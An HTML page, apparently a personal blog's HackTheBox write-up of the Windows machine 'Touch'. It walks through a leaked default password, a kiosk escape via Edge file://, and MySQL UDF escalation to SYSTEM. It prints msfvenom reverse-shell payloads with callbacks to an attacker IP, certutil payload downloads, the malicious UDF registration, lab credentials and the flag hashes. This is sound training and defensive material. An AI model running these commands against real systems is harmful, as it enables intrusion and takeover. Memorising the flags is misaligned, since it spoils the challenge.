@@ -1,0 +1,411 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Touch HTB Writeup - DeviceHub, Kiosk Escape, MySQL UDF | BitR1FT</title>
+  <meta name="description" content="HackTheBox Touch walkthrough: DeviceHub serial leak, kiosk escape via Edge file://, MySQL UDF privilege escalation to SYSTEM.">
+  <meta name="keywords" content="Touch HTB, HackTheBox Touch, DeviceHub, Kiosk Escape, MySQL UDF, Windows privilege escalation, HackTheBox writeup">
+  <meta name="author" content="Adeel Haider (BitR1FT)">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#0b0a0a">
+  <link rel="canonical" href="https://bitr1ft.github.io/touch.html">
+  <link rel="icon" href="bitr1ft.jpg">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="BitR1FT">
+  <meta property="og:title" content="Touch HTB Writeup - DeviceHub, Kiosk Escape, MySQL UDF | BitR1FT">
+  <meta property="og:description" content="HackTheBox Touch walkthrough: DeviceHub serial leak, kiosk escape via Edge file://, MySQL UDF privilege escalation to SYSTEM.">
+  <meta property="og:url" content="https://bitr1ft.github.io/touch.html">
+  <meta property="og:image" content="https://bitr1ft.github.io/profile.jpg">
+  <meta property="article:published_time" content="2026-10-10">
+  <meta property="article:author" content="Adeel Haider">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Touch HTB Writeup - DeviceHub, Kiosk Escape, MySQL UDF | BitR1FT">
+  <meta name="twitter:description" content="HackTheBox Touch walkthrough: DeviceHub serial leak, kiosk escape via Edge file://, MySQL UDF privilege escalation to SYSTEM.">
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Touch HTB Writeup - DeviceHub, Kiosk Escape, MySQL UDF | BitR1FT","description":"HackTheBox Touch walkthrough: DeviceHub serial leak, kiosk escape via Edge file://, MySQL UDF privilege escalation to SYSTEM.","url":"https://bitr1ft.github.io/touch.html","datePublished":"2026-10-10","author":{"@type":"Person","name":"Adeel Haider","alternateName":"BitR1FT"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Navigation -->
+  <nav>
+    <a href="index.html" class="nav-brand">BitR1FT<span class="cursor"></span></a>
+    <div class="nav-links">
+      <a href="index.html#about">About</a>
+      <a href="index.html#experience">Experience</a>
+      <a href="projects.html">Projects</a>
+      <a href="blog.html" class="active">Writeups</a>
+      <a href="AdeelHaider.pdf" target="_blank">Resume</a>
+      <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer" class="github-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+      </a>
+    </div>
+    <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="18" y2="18"/></svg>
+    </button>
+  </nav>
+  <div class="mobile-menu" id="mobile-menu">
+    <a href="index.html#about">About</a>
+    <a href="index.html#experience">Experience</a>
+    <a href="projects.html">Projects</a>
+    <a href="blog.html">Writeups</a>
+    <a href="AdeelHaider.pdf" target="_blank">Resume</a>
+  </div>
+
+  <!-- Main Content -->
+  <main style="padding-top:calc(var(--nav-height) + 1rem);">
+    <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+
+      <a href="blog.html" class="blog-back">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+        Back to Writeups
+      </a>
+
+      <div class="blog-header">
+        <div class="blog-title-row">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 12c.78 0 1.5-.38 1.94-.97.44-.6.56-1.38.33-2.08a3.27 3.27 0 0 0-4.54 0 2.05 2.05 0 0 0 .33 2.08c.44.6 1.16.97 1.94.97Z"/><path d="M14.5 17.5c0 1.38-1.12 2.5-2.5 2.5s-2.5-1.12-2.5-2.5c0-1.66 2.5-4.5 2.5-4.5s2.5 2.84 2.5 4.5Z"/></svg>
+          <h1 class="blog-title">Touch</h1>
+          <span class="badge badge-medium">Medium</span>
+        </div>
+        <p class="blog-os">Windows</p>
+        <p class="blog-summary">Exploited an unauthenticated DeviceHub API that leaked the device serial (used as the default password), extracted KioskUser credentials from the admin dashboard, escaped a locked-down RDP kiosk via an error dialog and Edge file:// protocol, then escalated to SYSTEM by loading a malicious MySQL UDF into a writable plugin directory.</p>
+        <div class="blog-meta-row">
+          <div class="blog-meta-section">
+            <div class="vuln-label">Vulnerabilities</div>
+            <div class="tech-tags">
+              <span class="badge badge-destructive">Information Disclosure</span>
+              <span class="badge badge-destructive">Default Credentials</span>
+              <span class="badge badge-destructive">Kiosk Escape</span>
+              <span class="badge badge-destructive">MySQL UDF</span>
+            </div>
+          </div>
+          <div class="blog-meta-section">
+            <div class="tools-label">Tools Used</div>
+            <div class="tech-tags">
+              <span class="badge badge-outline">nmap</span>
+              <span class="badge badge-outline">curl</span>
+              <span class="badge badge-outline">xfreerdp3</span>
+              <span class="badge badge-outline">msfvenom</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <hr style="max-width:48rem;margin:0 auto 2.5rem;height:1px;background:linear-gradient(90deg,rgba(34,197,94,0.25),transparent);border:none;">
+
+      <!-- Full Writeup Content -->
+      <div class="prose">
+
+        <h2>Summary</h2>
+        <ul>
+          <li>Discovered an unauthenticated DeviceHub API endpoint (<code>/api/status</code>) that leaked the device serial number <code>NX-DH-2024-B7042</code>.</li>
+          <li>Used the serial as the default admin password to authenticate to the Nexion DeviceHub management portal on port 8443.</li>
+          <li>Extracted clear-text KioskUser credentials (<code>KioskUser:K!0sk2026#</code>) from the dashboard and scanner pages.</li>
+          <li>Gained RDP access into a heavily restricted kiosk environment running the HTB Airways self-check-in application.</li>
+          <li>Remotely powered off the DocReader and Printer services, triggering an application error dialog whose support hyperlink launched Microsoft Edge.</li>
+          <li>Escaped the kiosk by navigating to <code>file:///C:/Windows/System32/cmd.exe</code>, obtaining a command prompt as KioskUser.</li>
+          <li>Established a reverse shell, retrieved the user flag, then escalated to SYSTEM by abusing a writable MySQL plugin directory and a plaintext root password found in a scheduled maintenance script.</li>
+        </ul>
+
+        <h2>Port Scan</h2>
+        <p>Started with a full TCP service/version scan on the target.</p>
+        <pre><code>$ nmap -sV -sC -p- --min-rate 1000 -T4 10.129.126.135
+
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Nexion DeviceHub - Login</code></pre>
+        <table>
+          <thead>
+            <tr>
+              <th>Port</th>
+              <th>Service</th>
+              <th>Version</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>135</code></td>
+              <td>msrpc</td>
+              <td>Microsoft Windows RPC</td>
+            </tr>
+            <tr>
+              <td><code>3389</code></td>
+              <td>ms-wbt-server</td>
+              <td>Microsoft Terminal Service</td>
+            </tr>
+            <tr>
+              <td><code>5985</code></td>
+              <td>http</td>
+              <td>Microsoft HTTPAPI 2.0 (WinRM)</td>
+            </tr>
+            <tr>
+              <td><code>8443</code></td>
+              <td>http</td>
+              <td>Microsoft HTTPAPI 2.0 (DeviceHub)</td>
+            </tr>
+          </tbody>
+        </table>
+        <p>Four open ports. Port 8443 hosts the primary attack surface — the Nexion DeviceHub management interface.</p>
+
+        <h2>Web Enumeration</h2>
+        <p>Port 8443 serves the Nexion DeviceHub login page:</p>
+        <pre><code>$ curl -v http://10.129.126.135:8443/login</code></pre>
+        <p>Page title: <strong>Nexion DocReader / DeviceHub DH-100 — Gate B7</strong>. A tooltip on the “Forgot your password?” link states:</p>
+        <pre><code>The default password is the device serial number included in your DeviceHub packaging.</code></pre>
+        <p>An unauthenticated status endpoint leaks the serial:</p>
+        <pre><code>$ curl http://10.129.126.135:8443/api/status
+{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online",...}</code></pre>
+
+        <h2>DeviceHub Authentication</h2>
+        <p>Authenticated using the leaked serial as the password:</p>
+        <pre><code>$ curl -v -X POST http://10.129.126.135:8443/login \
+  -d "password=NX-DH-2024-B7042" -c cookies.txt -L</code></pre>
+        <p>Successful login sets the <code>nxsession</code> cookie and redirects to <code>/dashboard</code>.</p>
+
+        <h2>Credential Exposure</h2>
+        <p>The dashboard and scanner pages display clear-text credentials for the attached kiosk devices:</p>
+        <pre><code>Username : KioskUser
+Password : K!0sk2026#</code></pre>
+        <p>These credentials are also shown (masked by default) under both the Passport Scanner and Boarding Pass Printer cards.</p>
+
+        <h2>RDP Access</h2>
+        <p>Used the recovered credentials to obtain an RDP session:</p>
+        <pre><code>$ xfreerdp3 /v:10.129.126.135 /u:KioskUser /p:'K!0sk2026#' /clipboard /cert:ignore</code></pre>
+        <p>The session lands inside a locked-down kiosk running the HTB Airways self-check-in application. There is no normal desktop, no taskbar and no Start menu. Booking lookup succeeds with the credentials recovered from the previous machine “Layover”:</p>
+        <pre><code>Booking Ref : KS7X2M
+Last Name   : CRAWFORD</code></pre>
+
+        <h2>Kiosk Escape</h2>
+        <p>From the attacker’s browser (still authenticated to DeviceHub) the DocReader and Printer services were powered off:</p>
+        <pre><code>$ curl -b cookies.txt -X POST http://10.129.126.135:8443/api/scanner/power \
+  -H "Content-Type: application/json" -d '{"powered":false}'
+
+$ curl -b cookies.txt -X POST http://10.129.126.135:8443/api/printer/power \
+  -H "Content-Type: application/json" -d '{"powered":false}'</code></pre>
+        <p>Inside the RDP kiosk any action that contacts the now-offline DocReader service (e.g. Staff Login or Scan Passport) produces an error dialog:</p>
+        <pre><code>Nexion DocReader SR-4200 has stopped responding.
+Error Code: SCN-ERR-4092
+Device: NX-SR-2024-0042
+Contact your system administrator or visit the support page for troubleshooting steps.
+https://support.nexionsystems.com/docreader/troubleshoot</code></pre>
+        <p>Clicking the support hyperlink opens Microsoft Edge. In the address bar:</p>
+        <pre><code>file:///C:/Windows/System32/cmd.exe</code></pre>
+        <p>Edge treats the path as a download. Opening the file launches <code>cmd.exe</code> as KioskUser, escaping the kiosk restrictions.</p>
+
+        <h2>Reverse Shell</h2>
+        <p>On Kali a reverse-shell executable was generated and hosted:</p>
+        <pre><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.191 LPORT=443 -f exe -o shell.exe
+$ python3 -m http.server 80
+$ nc -lvnp 443</code></pre>
+        <p>On the target the payload was downloaded and executed:</p>
+        <pre><code>C:\Users\KioskUser\Downloads&gt; certutil -urlcache -split -f http://10.10.15.191/shell.exe C:\Users\KioskUser\Downloads\shell.exe
+C:\Users\KioskUser\Downloads&gt; C:\Users\KioskUser\Downloads\shell.exe</code></pre>
+        <p>A stable reverse shell was obtained as <code>kiosk-042\kioskuser</code>.</p>
+
+        <h2>User Flag</h2>
+        <pre><code>C:\Users\KioskUser\Desktop&gt; type user.txt
+4c5c48bce9dd50c18bf06f5f331094a5</code></pre>
+
+        <h2>Privilege Escalation — MySQL UDF</h2>
+        <h3>Enumeration</h3>
+        <p>Group membership included <code>KIOSK-042\Printer Administrators</code>. Local listening services revealed MySQL on <code>127.0.0.1:3306</code>.</p>
+        <pre><code>C:\&gt; icacls "C:\MySQL\bin"
+C:\&gt; icacls "C:\MySQL\lib\plugin"</code></pre>
+        <p>Both directories are writable by <code>NT AUTHORITY\Authenticated Users</code>. The MySQL service runs as <code>NT AUTHORITY\SYSTEM</code>.</p>
+
+        <h3>Credential Discovery</h3>
+        <p>A scheduled maintenance script contained the MySQL root password in clear text:</p>
+        <pre><code>C:\&gt; type "C:\ProgramData\HTB Airways\refresh-dates.bat"
+@echo off
+C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 &lt; "C:\ProgramData\HTB Airways\refresh-dates.sql" 2&gt;nul</code></pre>
+        <p>MySQL root password: <code>HTB@irw4ys_DB!2026</code></p>
+
+        <h3>Malicious UDF</h3>
+        <p>On Kali a DLL payload was generated on a second port:</p>
+        <pre><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.191 LPORT=5555 -f dll -o evil.dll
+$ python3 -m http.server 80
+$ nc -lvnp 5555</code></pre>
+        <p>On the target the DLL was placed in the writable plugin directory and registered:</p>
+        <pre><code>C:\&gt; certutil -urlcache -split -f http://10.10.15.191/evil.dll C:\MySQL\lib\plugin\evil.dll
+C:\&gt; C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.dll';"</code></pre>
+        <p>MySQL loaded the DLL under the SYSTEM account, delivering a reverse shell as <code>NT AUTHORITY\SYSTEM</code>.</p>
+
+        <h2>Root Flag</h2>
+        <pre><code>C:\Users\Administrator\Desktop&gt; type root.txt
+59674452034C5BB3271D4DD9532FD36B</code></pre>
+
+        <h2>Flags</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Flag</th>
+              <th>Location</th>
+              <th>Value</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>User</td>
+              <td><code>C:\Users\KioskUser\Desktop\user.txt</code></td>
+              <td><code>4c5c48bce9dd50c18bf06f5f331094a5</code></td>
+            </tr>
+            <tr>
+              <td>Root</td>
+              <td><code>C:\Users\Administrator\Desktop\root.txt</code></td>
+              <td><code>59674452034C5BB3271D4DD9532FD36B</code></td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2>Full Attack Chain</h2>
+        <pre><code>┌──────────────────────────────────────────────────────────────┐
+│                     Touch - Attack Chain                       │
+├──────────────────────────────────────────────────────────────┤
+│                                                              │
+│  [1] Port Scan (nmap)                                        │
+│   ├── 135/tcp  → MSRPC                                       │
+│   ├── 3389/tcp → RDP                                         │
+│   ├── 5985/tcp → WinRM                                       │
+│   └── 8443/tcp → Nexion DeviceHub                            │
+│       │                                                      │
+│  [2] Unauthenticated API                                     │
+│   └── /api/status → serial NX-DH-2024-B7042                  │
+│       │                                                      │
+│  [3] DeviceHub Authentication                                │
+│   └── serial = default password → admin session              │
+│       │                                                      │
+│  [4] Credential Exposure                                     │
+│   └── Dashboard → KioskUser:K!0sk2026#                       │
+│       │                                                      │
+│  [5] RDP Foothold                                            │
+│   └── Locked-down kiosk (HTB Airways)                        │
+│       │                                                      │
+│  [6] Service Power-Off                                       │
+│   └── /api/scanner/power + /api/printer/power                │
+│       │                                                      │
+│  [7] Error Dialog → Edge                                     │
+│   └── support hyperlink launches unrestricted browser        │
+│       │                                                      │
+│  [8] Kiosk Escape                                            │
+│   └── file:///C:/Windows/System32/cmd.exe                    │
+│       │                                                      │
+│  [9] Reverse Shell → KioskUser                               │
+│   └── USER FLAG                                              │
+│       │                                                      │
+│  [10] MySQL Root Password                                    │
+│   └── refresh-dates.bat → HTB@irw4ys_DB!2026                 │
+│       │                                                      │
+│  [11] Writable Plugin Directory                              │
+│   └── C:\MySQL\lib\plugin (Authenticated Users)              │
+│       │                                                      │
+│  [12] Malicious UDF DLL                                      │
+│   └── CREATE FUNCTION ... SONAME 'evil.dll'                  │
+│       │                                                      │
+│  [13] SYSTEM Shell → ROOT FLAG                               │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘</code></pre>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+          <li><strong>Unauthenticated device-management APIs that leak serial numbers</strong> turn default-password schemes into free authentication.</li>
+          <li><strong>Administrative panels should never display end-user or service credentials in plaintext</strong> — the DeviceHub dashboard exposed KioskUser credentials to anyone who logged in with the serial.</li>
+          <li><strong>Kiosk lockdown is only as strong as the least-restricted application</strong> that can be launched from an error dialog; the support hyperlink provided a path to unrestricted Edge.</li>
+          <li><strong><code>file://</code> protocol handling inside a kiosk browser</strong> remains a classic and reliable escape path.</li>
+          <li><strong>Database service accounts should never run as LocalSystem</strong>; a writable plugin directory combined with SYSTEM privileges is a direct code-execution vector.</li>
+          <li><strong>Secrets stored in clear text inside scheduled scripts</strong> are trivial to recover and frequently complete the privilege-escalation chain when paired with a writable code-execution path.</li>
+        </ul>
+
+        <h2>Tools Used</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Tool</th>
+              <th>Purpose</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>nmap</code></td>
+              <td>Port scanning and service version detection</td>
+            </tr>
+            <tr>
+              <td><code>curl</code></td>
+              <td>Web interaction, DeviceHub authentication and API control</td>
+            </tr>
+            <tr>
+              <td><code>xfreerdp3</code></td>
+              <td>RDP access into the kiosk session</td>
+            </tr>
+            <tr>
+              <td><code>msfvenom</code></td>
+              <td>Generation of reverse-shell EXE and malicious UDF DLL</td>
+            </tr>
+            <tr>
+              <td><code>certutil</code></td>
+              <td>Downloading payloads onto the target</td>
+            </tr>
+            <tr>
+              <td><code>nc</code></td>
+              <td>Reverse shell listeners (user and SYSTEM)</td>
+            </tr>
+            <tr>
+              <td><code>mysql.exe</code></td>
+              <td>Registering the malicious UDF under the root account</td>
+            </tr>
+          </tbody>
+        </table>
+
+      </div>
+      <!-- End prose -->
+
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-contact">
+        <a href="mailto:adeelhaider304@gmail.com">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+          adeelhaider304@gmail.com
+        </a>
+        <span class="sep"></span>
+        <span>
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+          0330-6869777
+        </span>
+        <span class="sep"></span>
+        <span>
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
+          Islamabad, Pakistan
+        </span>
+        <span class="sep"></span>
+        <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+          BitR1FT
+        </a>
+        <span class="sep"></span>
+        <a href="https://www.linkedin.com/in/4deel/" target="_blank" rel="noopener noreferrer">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect width="4" height="12" x="2" y="9"/><circle cx="4" cy="4" r="2"/></svg>
+          4deel
+        </a>
+      </div>
+      <div class="footer-bottom">
+        <p class="footer-left">&copy; 2026 <span class="accent">BitR1FT</span> — Adeel Haider</p>
+        <p class="footer-right">
+          <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
+          Built with passion &amp; caffeine
+          <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
+          <span class="accent">pwn all the things</span>
+        </p>
+      </div>
+    </div>
+  </footer>
+  <script src="main.js" defer></script>
+</body>
+</html>
